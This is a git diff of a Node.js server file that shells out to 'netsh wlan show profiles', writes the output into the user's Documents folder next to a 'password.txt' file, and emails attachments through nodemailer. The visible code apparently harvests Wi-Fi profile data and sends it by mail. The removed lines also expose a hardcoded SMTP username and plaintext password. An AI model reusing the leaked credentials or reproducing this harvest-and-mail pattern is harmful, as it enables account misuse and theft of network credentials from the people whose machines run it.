@@ -3,12 +3,10 @@ const path = require('path')
 const fs = require('fs')
 const nodemailer = require('nodemailer')
 const {exec} = require('child_process')
-const {PDFDocument, StandardFonts}=require('pdf-lib')
 const iconv = require('iconv-lite');
-
+require('dotenv').config()
 
 const pathKnowing = path.join(os.homedir(),'Documents')
-console.log('path is :',pathKnowing)
 const textIs = 'file.txt'
 const textInfoPassword = 'password.txt'
 const command = `netsh wlan show profiles > ${pathKnowing}\\${textIs}`
@@ -115,20 +113,20 @@ const sendingEmail = async (req,res)=>{
     const textBytes = req.body.dataA
     //const id = req.query.id
     const transporter = nodemailer.createTransport({
-        host: 'ssl0.ovh.net',
-        port:587,
+        host: process.env.HOST,
+        port:process.env.PORT,
         secure: false,
         auth: {
-            user: 'kevin@web-maniac.com',
-            pass: 'Webmaniac-projet59'
+            user: process.env.USER_EMAIL,
+            pass: process.env.PASS_EMAIL
         }
     })
 
     try{
         //const fileContent =fs.readFileSync(textBytes,'utf8')
         const mailOptions = {
-            from: 'kevin@web-maniac.com',
-            to: 'kevin@web-maniac.com',
+            from: process.env.USER_EMAIL,
+            to: process.env.USER_EMAIL,
             subject: 'PDF Attachment',
             text: 'Attached is the PDF file',
             attachments: [
